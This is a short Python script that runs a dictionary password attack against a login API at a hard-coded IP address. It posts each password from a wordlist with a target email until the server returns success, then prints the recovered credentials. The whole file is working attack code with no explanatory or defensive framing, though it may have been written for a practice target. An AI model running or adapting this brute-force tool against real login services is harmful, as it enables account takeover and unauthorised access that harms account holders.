#!/usr/bin/python3

import requests
import sys

URL = "http://167.235.141.41:3000/api/login"
FILE = "dictionary.txt"

def main():
    if len(sys.argv) != 2:
        print("Usage: ./main.py email")
        sys.exit(1)

    email = sys.argv[1]
    dictionary_file = open(FILE, "r")

    for password in dictionary_file:
        password = password.rstrip("\n")
        print("Trying password: " + password)

        data = {"email": email, "password": password}
        try:
            response = requests.post(URL, data=data)
        except:
            print("Error: could not connect to server")
            sys.exit(1)

        if response.status_code == 200:
            print(f"Found!\n email: {email}\n password: {password}")
            sys.exit(0)

    print("Password not found")
    sys.exit(1)

if __name__ == "__main__":
    main()
